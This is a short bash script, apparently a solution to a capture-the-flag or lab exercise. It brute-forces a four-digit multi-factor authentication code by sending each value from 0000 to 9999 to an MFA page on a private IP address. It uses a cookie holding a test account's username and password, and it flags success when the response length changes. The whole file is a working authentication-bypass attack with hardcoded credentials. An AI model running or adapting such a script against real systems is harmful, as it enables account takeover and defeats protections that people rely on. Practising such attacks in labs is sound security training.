#!/bin/bash

for i in {0000..9999}; do
  echo $i
  curl_output=$(curl -X POST -s --data "code=$i" http://10.10.156.108/console/mfa.php --cookie "user=jason_test_account; pwd=abkr")
  echo "$curl_output" | wc | grep -v "24      95    1524"
  if [ $? -eq 0 ]
  then echo FOUND IT 
  break
  fi 
done
